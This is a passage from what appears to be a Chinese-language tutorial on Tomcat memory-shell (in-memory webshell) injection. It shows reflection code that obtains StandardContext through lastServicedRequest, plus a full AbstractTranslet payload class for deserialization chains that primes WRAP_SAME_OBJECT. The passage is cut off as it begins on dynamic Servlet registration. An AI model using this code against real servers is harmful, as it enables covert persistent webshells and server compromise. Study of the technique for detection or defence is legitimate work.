<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br></pre></td></tr></table></figure></div>

<p>另外下面这种方式也可以获取 <code>standardContext</code>，但是过程要麻烦一些。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span>(ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure></div>

<p>对于任意字节码加载这种情况，由于触发漏洞点的位置不一定能获取到 <code>request</code> 对象，因此我们需要寻找其他通用的方式获取。</p>
<h5 id="从-ApplicationFilterChain-获取"><a href="#从-ApplicationFilterChain-获取" class="headerlink" title="从 ApplicationFilterChain 获取"></a>从 ApplicationFilterChain 获取</h5><p><code>org.apache.catalina.core.ApplicationFilterChain</code> 是 <strong>Tomcat 里 <code>FilterChain</code> 的实现</strong>：为“这一次请求&#x2F;一次转发调度”把<strong>所有匹配到的 Filter 排成一条链</strong>，然后<strong>依次调用它们</strong>；当所有 Filter 都跑完后，**最后一次 <code>doFilter()</code> 就会去调目标 <code>Servlet#service()</code>**。</p>
<p>其中在 <code>ApplicationFilterChain</code> 中有两个静态变量 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title class_">FilterChain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于满足 Servlet 规范 SRV.8.2 / SRV.14.2.5.1：</span></span><br><span class="line">    <span class="comment">// 在 forward/include 等调度场景中，需要确保传递给目标资源的</span></span><br><span class="line">    <span class="comment">// 是“同一（或按规范要求包装后的同一）”request/response 对象。</span></span><br><span class="line">    <span class="comment">// 这里通过 ThreadLocal 在“当前工作线程”上暂存本次正在服务的</span></span><br><span class="line">    <span class="comment">// ServletRequest / ServletResponse，以便链路内其它位置在同一线程中取用。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态初始化：是否启用上述暂存机制由 ApplicationDispatcher.WRAP_SAME_OBJECT 决定。</span></span><br><span class="line">    <span class="comment">// - 当为 true：创建 ThreadLocal 实例；在链尾调用 servlet.service(...) 前 set(...)，</span></span><br><span class="line">    <span class="comment">//   并在 finally 中 set(null) 清理，避免线程池复用导致的跨请求泄漏。</span></span><br><span class="line">    <span class="comment">// - 当为 false：禁用该机制，字段保持为 null，调用处不会尝试 set(...)。</span></span><br><span class="line">    <span class="comment">//  （注意：类一旦按 false 分支完成初始化，后续即便把开关改为 true，</span></span><br><span class="line">    <span class="comment">//    也不会自动重新创建 ThreadLocal；除非你自行以反射等方式重新赋值。）</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">            lastServicedResponse = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lastServicedRequest = <span class="literal">null</span>;      <span class="comment">// 明确禁用：减少开销并防止误用</span></span><br><span class="line">            lastServicedResponse = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在静态代码块中，如果 <code>org.apache.catalina.core.ApplicationDispatcher#WRAP_SAME_OBJECT</code> 为 <code>true</code> 则这两个变量会被初始化为 <code>java.lang.ThreadLocal</code>。</p>
<p><code>ThreadLocal</code> 是 Java 中针对每个线程存储自身的变量的一个容器。在 <code>ApplicationFilterChain#internalDoFilter</code> 函数调用 <code>javax.servlet#service</code> 函数前，会分别为其设置 <code>request</code> 和 <code>response</code> 对象。而在 <code>javax.servlet#service</code> 函数调用后，又会清空 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 走到过滤器链的末端 —— 开始真正调用目标 Servlet 实例</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 若启用“同一对象包装”语义（WRAP_SAME_OBJECT），</span></span><br><span class="line">    <span class="comment">// 将当前线程正在处理的 request/response 放到两个 ThreadLocal 里，</span></span><br><span class="line">    <span class="comment">// 以满足规范对 forward/include 等场景中对象同一性的要求。</span></span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest.set(request);</span><br><span class="line">        lastServicedResponse.set(response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果请求标记为支持异步，但目标 Servlet 本身不支持异步，</span></span><br><span class="line">    <span class="comment">// 在请求属性里放一个标志，后续组件可据此禁用/回退异步处理。</span></span><br><span class="line">    <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">        request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从这行起，可能使用的是被 Filter/Dispatcher 包装过的 request/response</span></span><br><span class="line">    <span class="comment">// 若启用了安全管理（SecurityManager），且是 HTTP 请求/响应，</span></span><br><span class="line">    <span class="comment">// 则通过 SecurityUtil 以特权方式调用 Servlet#service，传入当前用户主体。</span></span><br><span class="line">    <span class="keyword">if</span> ((request <span class="keyword">instanceof</span> HttpServletRequest) &amp;&amp; (response <span class="keyword">instanceof</span> HttpServletResponse) &amp;&amp;</span><br><span class="line">            Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">        <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line">        Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; req, res &#125;;</span><br><span class="line">        <span class="comment">// 以特权（doAsPrivilege）调用目标 servlet 的 &quot;service&quot; 方法</span></span><br><span class="line">        SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>, servlet, classTypeUsedInService, args, principal);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 常规路径：直接调用目标 servlet 的 service 方法</span></span><br><span class="line">        servlet.service(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">    <span class="comment">// 常见受检/非受检异常：原样抛出，交给上层容器处理</span></span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    <span class="comment">// 其它异常（包含反射包装的 InvocationTargetException 等）：</span></span><br><span class="line">    <span class="comment">// 先解包，再按容器约定处理可抛型，最后包装成 ServletException 抛出</span></span><br><span class="line">    e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">    ExceptionUtils.handleThrowable(e);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.servlet&quot;</span>), e);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 清理 ThreadLocal，防止在线程池场景下发生跨请求数据泄漏</span></span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest.set(<span class="literal">null</span>);</span><br><span class="line">        lastServicedResponse.set(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此如果漏洞点可以从 <code>javax.servlet#service</code> 调用过来，那么我们就可以通过 <code>lastServicedRequest</code> 对象获取本次请求对应的 <code>ServletRequest</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">applicationFilterChainClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line"></span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> applicationFilterChainClass.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ThreadLocal</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lastServicedRequest != <span class="literal">null</span> &amp;&amp; lastServicedRequest.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletRequest) lastServicedRequest.get();</span><br><span class="line">    </span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> servletRequest.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">	requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">	<span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request.getContext();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> standardContext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>由于调用 Filter 的位置位于 <code>lastServicedRequest</code> 赋值之前，因此这个方法不适用于漏洞点位于 Filter 的情况。这也正是为什么 Shiro 反序列化中不能用这个来做回显的原因。</p>

    </div>
  </div>

<p>然而通常来说 <code>WRAP_SAME_OBJECT</code> 的值为 <code>false</code>，因此在反射获取 <code>ServletContext</code> 之前，我们需要先：</p>
<ul>
<li>将 <code>org.apache.catalina.core.ApplicationDispatcher#WRAP_SAME_OBJECT</code> 设置为 <code>true</code>，确保下次请求能够将 <code>ServletRequest</code> 对象保存在 <code>lastServicedRequest</code> 中。</li>
<li>将 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 设置为 <code>ThreadLocal</code>，否则下一次请求调用 <code>set</code> 方法会触发 NPE。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationDispatcherPrimingTranslet</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            setFieldValue(</span><br><span class="line">                    <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;lastServicedRequest&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;()</span><br><span class="line">            );</span><br><span class="line">            setFieldValue(</span><br><span class="line">                    <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;lastServicedResponse&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;()</span><br><span class="line">            );</span><br><span class="line">            setFieldValue(</span><br><span class="line">                    <span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>,</span><br><span class="line">                    <span class="literal">true</span></span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String className, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getDeclaredField(clazz, fieldName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> getDeclaredField(field.getClass(), <span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">        field.set(<span class="literal">null</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="从-AbstractProcessor-获取"><a href="#从-AbstractProcessor-获取" class="headerlink" title="从 AbstractProcessor 获取"></a>从 AbstractProcessor 获取</h5><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Http11Processor</span> <span class="keyword">extends</span> <span class="title class_">AbstractProcessor</span> &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractProcessor</span> <span class="keyword">extends</span> <span class="title class_">AbstractProcessorLight</span> <span class="keyword">implements</span> <span class="title class_">ActionHook</span> &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Request request;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Response response;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">at HelloWorldServlet.service(HelloWorldServlet.java:33)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:212)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:156)</span><br><span class="line">at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:181)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:156)</span><br><span class="line">at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)</span><br><span class="line">at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)</span><br><span class="line">at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:483)</span><br><span class="line">at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)</span><br><span class="line">at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)</span><br><span class="line">at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)</span><br><span class="line">at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)</span><br><span class="line">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:617)</span><br></pre></td></tr></table></figure></div>

<h4 id="请求头过长问题"><a href="#请求头过长问题" class="headerlink" title="请求头过长问题"></a>请求头过长问题</h4><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/15167571.html" >https://www.cnblogs.com/zpchcbd/p/15167571.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="基于-Servlet-API"><a href="#基于-Servlet-API" class="headerlink" title="基于 Servlet API"></a>基于 Servlet API</h3><p>Servlet、Listener、Filter 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p>
<p>Servlet 3.0 API 允许使 <code>ServletContext</code> 用动态进行注册，在 Web 容器初始化的时候（即建立<code>ServletContext</code> 对象的时候）进行动态注册。可以看到 <code>ServletContext</code> 提供了 <code>add*</code>&#x2F;<code>create*</code> 方法来实现动态注册的功能。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ServletContext</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 作用：Servlet 与“Servlet 容器”交互的总入口。可用于：</span></span><br><span class="line"><span class="comment"> *  - 查询资源/文件的 MIME 类型、获取资源流、请求分派（forward/include）；</span></span><br><span class="line"><span class="comment"> *  - 动态注册 Servlet / Filter / Listener（自 Servlet 3.0 起）；</span></span><br><span class="line"><span class="comment"> *  - 写容器日志、访问应用级初始化参数与属性等。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 实例个数：同一个 JVM 内，一个 Web 应用仅有一个 ServletContext 实例；</span></span><br><span class="line"><span class="comment"> * 若应用在部署描述中标记为“分布式”（distributed），则集群中每个 JVM 都会有各自的</span></span><br><span class="line"><span class="comment"> * ServletContext；此时不要把它当作“全局共享存储”，跨 JVM 的共享应使用外部资源（如 DB）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 获取途径：容器在初始化 Servlet 时，通过 ServletConfig 提供 ServletContext。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：下面仅列出与“编程式注册”（Servlet 3.0+）相关的常用方法，其它方法已省略。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletContext</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===== Servlet =====</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 容器实例化一个 Servlet（仅创建，不注册映射）。 */</span></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">Servlet</span>&gt; T <span class="title function_">createServlet</span><span class="params">(Class&lt;T&gt; c)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Servlet（类名）→ 返回可继续配置映射/参数的句柄。 */</span></span><br><span class="line">    ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName, String className)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Servlet（实例）。 */</span></span><br><span class="line">    ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName, Servlet servlet)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Servlet（Class，由容器创建实例）。 */</span></span><br><span class="line">    ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName, Class&lt;? extends Servlet&gt; servletClass)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ===== Listener =====</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 容器实例化一个 Listener（仅创建，不注册）。 */</span></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">EventListener</span>&gt; T <span class="title function_">createListener</span><span class="params">(Class&lt;T&gt; c)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Listener（类名）。 */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(String className)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Listener（实例）。 */</span></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">EventListener</span>&gt; <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(T t)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Listener（Class，由容器创建实例）。 */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addListener</span><span class="params">(Class&lt;? extends EventListener&gt; listenerClass)</span>;</span><br><span class="line"></span><br><span 